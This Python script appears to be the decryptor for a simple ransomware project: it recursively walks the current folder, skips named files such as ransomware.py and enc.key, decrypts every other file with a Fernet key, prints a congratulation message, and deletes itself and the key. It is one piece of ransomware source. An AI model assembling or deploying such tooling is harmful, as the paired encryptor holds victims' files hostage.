import os
from cryptography.fernet import Fernet

skip = ["ransomware.py", "enc.key", "decrypt.py", "cutecheatsheet.sh", "cutefile.zip"]


def return_files(path):
    files = []
    for file in os.listdir(path):
        if file in skip:
            continue

        if os.path.isdir(path + "/" + file):
            filedir = os.path.join(path, file)
            files += return_files(filedir)
        elif os.path.isfile(path + "/" + file):
            files.append(path + "/" + file)

    return files


files = return_files(".")

with open("enc.key", "rb") as key:
    secret = key.read()

for file in files:
    with open(file, "rb") as curr:
        contents = curr.read()

    decrypt_contents = Fernet(secret).decrypt(contents)

    with open(file, "wb") as curr:
        curr.write(decrypt_contents)

print("Congratulations, your files have been decrypted.")


os.remove("decrypt.py")
os.remove("enc.key")
